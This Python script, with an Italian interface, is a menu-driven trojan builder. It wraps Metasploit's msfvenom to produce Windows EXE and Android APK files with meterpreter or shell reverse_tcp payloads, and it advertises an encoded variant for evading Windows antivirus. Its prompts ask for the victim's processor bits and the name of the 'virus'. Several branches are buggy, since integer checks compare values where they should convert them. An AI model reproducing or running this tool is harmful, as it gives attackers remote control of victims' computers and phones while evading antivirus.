import os
import sys
from time import sleep


argomento_linea_comando = sys.argv[1] if sys.argv[1:] else '-h'
argv = str(argomento_linea_comando)

if argv == '-h':
	print('''
      ______ _____  ____  
     |  ____|  __ \|___ \ 
     | |__  | |__) | __) |
     |  __| |  _  / |__ < 
     | |    | | \ \ ___) |
     |_|    |_|  \_\____/ 
                      
       by Friend Red 3
       
     Questo tool ti permette con facilità nella modalità semplice, di creare trojan;
     usando METASPLOIT.
	
	-s  => indica di attivare la modalità semplice.
	-p  => indica la creazione di payloads per Windows o Android.
	-bw => indica la creazione di payload che bypassa l'antivirus di windows.
	-sw => indica la creazione di una shell per windows.
	-m  => indica l\' apertura di msfconsole.
	
	''')

elif argv == '-p':
	n = 0
	while (n <= 10):
		n += 1
		print('\t1)WINDOWS [EXE]\n\t2)ANDROID[APK]')
		numero = input('\t> ')
		try:
			numero = int(numero)
			if numero == 1 or numero == 2:
				break
			else:
				print('NON È SUL MENÙ')
				continue
		except ValueError:
			print('Errore!')
	if n == 10:
		print('RIPETERE!')
	elif numero == 1:
		ip = str(input('Ip > '))
		porta = str(input('Porta > '))
		nome_file = str(input('Nome e posizione > '))
		os.system('msfvenom -p windows/meterpreter/reverse_tcp lhost=' + ip + ' lport=' + porta + ' f exe -o ' + nome_file + '.exe')
	
	elif numero == 2:
		ip = str(input('Ip > '))
		porta = str(input('Porta > '))
		posizione = str(input('Nome e posizione > '))
		os.system('msfvenom -p android/meterpreter/reverse_tcp lhost='+ ip +' lport='+ porta + ' R apk > ' + posizione + '.apk')
		
elif argv == '-bw':
	ip = str(input('Ip > '))
	porta = str(input('Porta > '))
	bit = str(input('I bit della vittima > '))
	posizione = str(input('Nome e posizione > '))
	os.system('msfvenom -p windows/meterpreter/reverse_tcp -e '+ bit + ' -i 15 -b \'/x00\' lhost='+ ip + ' lport='+ porta + ' f exe -o '+ posizione + '.exe')

elif argv == '-sw':
	ip = str(input('IP > '))
	porta = str(input('Porta > '))
	bit = str(input('Bit della vittima > '))
	nome = str(input('Nome e posizione > '))
	os.system('msfvenom -a ' + bit + ' -p windows/shell/reverse_tcp lhost='+ ip + ' lport='+ porta + ' -b \'/x00\'' + ' -e x86/shikata_ga_nai -f exe -o '+ nome + '.exe')

elif argv == '-m':
	os.system('msfconsole')

elif argv == '-s':
	e = 'Sto chiudendo...'
	def logo():   
		print("""
		  ______ _____  ____  
		 |  ____|  __ \|___ \ 
		 | |__  | |__) | __) |
		 |  __| |  _  / |__ < 
		 | |    | | \ \ ___) |
		 |_|    |_|  \_\____/ 
						  
		   by Friend Red 3
			""")
	def logo1():
		print("""
		Questo tool ti permette con facilità, di creare trojan;
		usando METASPLOIT.  
					
		""")
			
	def menu():
		print("""
		1)Creazione di un payload.
		2)Creazione di payload che bypassa l'antivirus.
		3)Creazione di una shell per windows.
		4)Msfconsole.
		5)Uscita.
			""")

	def menu1():
		os.system('clear')
		logo()
		print("""
			1)Windows [EXE]
			2)Android [APK]
			""")
	def exe():
		str(pl)
		os.system('msfvenom -p windows/meterpreter/reverse_tcp lhost='+ ipl +' lport='+ str(pl) + ' f exe -o ' + po + '.exe')
		
	def apk():
		str(pL)
		os.system('msfvenom -p android/meterpreter/reverse_tcp lhost='+ ipL +' lport='+ str(pL) + ' R apk > '+ pO + '.apk')
		
	def bypassexe():
		os.system('msfvenom -p windows/meterpreter/reverse_tcp -e '+ bit + ' -i 15 -b \'/x00\' lhost='+ IP + ' lport='+ str(PORTA) + ' f exe -o '+ PO + '.exe')
	   



	while(True):
		os.system('clear')
		print('Apertura...')
		sleep(0.5)
		os.system('clear')
		logo()
		sleep(2.5)
		logo1()
		menu()
		try:
			x = int(input('Enter number: '))
			
		except ValueError:
			os.system('clear')
			print('NON È UN INTERO!')
			
		if x == 1:
				sleep(0.5)
				while(True):
					logo()
					menu1()
					try:
						y = str(input('Enter number: '))
						if y == 'uscita':
							os.system('clear')
							sleep(0.5)
							print('Sto tornando al menù...')
							sleep(0.5)
							break
						y == int(y)
						break
					except ValueError:
						os.system('clear')
						print('NON È UN INTERO!')
				if y == 1:
					sleep(0.5)
					print('Scrivi qua il tuo ip locale:')
					ipl = str(input('Enter ip: '))
					if ipl == 'uscita':
						os.system('clear')
						sleep(0.5)
						print(e)
						sleep(0.5)
						break
					print('Scrivi qua la porta: ')
					pl = str(input('Enter port: '))
					if pl == 'uscita':
						os.system('clear')
						sleep(0.5)
						print(e)
						sleep(0.5)
						break
					print('Scrivi qua la posizione e il nome del virus: ')
					po = str(input('Enter posizione: '))
					if po == 'uscita':
						os.system('clear')
						sleep(0.5) 
						print(e)
						sleep(0.5)
						break
					pl == int(pl)
					exe()
					break
					
				elif y == 2: 
					sleep(0.5)
					print('Scrivi qua il tuo ip locale: ')
					ipL = str(input('Enter ip: '))
					if ipL == 'uscita':
						os.system('clear')
						sleep(0.5)
						print(e)
						sleep(0.5)
						break
					print('Scrivi qua la porta: ')
					pL = str(input('Enter port: '))
					if pL == 'uscita':
						os.system('clear')
						sleep(0.5)
						print(e)
						sleep(0.5)
						break
					print('Scrivi qua la posizione e il nome del virus: ')
					pO = str(input('Enter posizione: '))
					if pO == 'uscita':
						os.system('clear')
						sleep(0.5)
						print(e)
						sleep(0.5)
						break
					pL == int(pL)
					apk()
					break
					
		elif x == 2: 
			sleep(0.5)
			logo()
			print("Scrivi qua il tuo ip.")
			IP = str(input('Enter ip: '))
			if IP == 'uscita':
				os.system('clear')
				sleep(0.5)
				print(e)
				sleep(0.5)
				break
			print("Scrivi qua la tua porta.")
			PORTA = str(input('Enter port: '))
			if PORTA == 'uscita':
				os.system('clear')
				sleep(0.5)
				print(e)
				sleep(0.5)
				break
			print("Scrivi qua i bit che ha il processore della vittima.")
			bit = str(input('Enter bit: '))
			if bit == 'uscita':
				os.system('clear')
				sleep(0.5)
				print(e)
				sleep(0.5)
				break
			print("Scrivi qua la posizione e il nome del virus.")
			PO = str(input('Enter posizione: '))
			if PO == 'uscita':
				os.system('clear')
				sleep(0.5)
				print(e)
				sleep(0.5)
				break
			PORTA == int(PORTA)
			bypassexe()
			break
			
		elif x == 3:
			sleep(0.5)
			logo()
		
			print('Scrivi qua il tuo ip: ')
			shellip = str(input('Enter ip: '))
			if shellip == 'uscita':
				os.system('clear')
				sleep(0.5)
				print(e)
				sleep(0.4)
				break
			print('Scrivi qua la porta: ')
			shellp = str(input('Enter port: '))
			if shellp == 'uscita':
				os.system('clear')
				sleep(0.5)
				print(e)
				sleep(0.5)
				break
			print('Scrivi qua i bit del coputer della vittima: ')
			shellbit = str(input('Enter bit: '))
			if shellbit == 'uscita':
				os.system('clear')
				sleep(0.5)
				print(e)
				sleep(0.5)
				break
			print('Scrivi qua la posizione e il nome del virus: ')
			shellpo = str(input('Enter posizine: '))
			if shellpo == 'uscita': 
				os.system('clear')
				sleep(0.5)
				print(e)
				sleep(0.5)
				break
			shellp == int(shellp)
			os.system('msfvenom -a ' + shellbit + ' -p windows/shell/reverse_tcp lhost='+ shellip + ' lport='+ str(shellp) + ' -b \'/x00\'' + ' -e x86/shikata_ga_nai -f exe -o '+ shellpo + '.exe')
			
			break    
		elif x == 4:
			sleep(0.5)
			os.system('clear')
			os.system('msfconsole') 
			break
			  
		elif x == 5:
			os.system("clear")
			sleep(0.5)
			print(e)
			sleep(0.5)
			break
		else: 
			sleep(0.5)
			print('Non è sul menù')
			continue
else:
	print('scrivere -h per l\' aiuto')
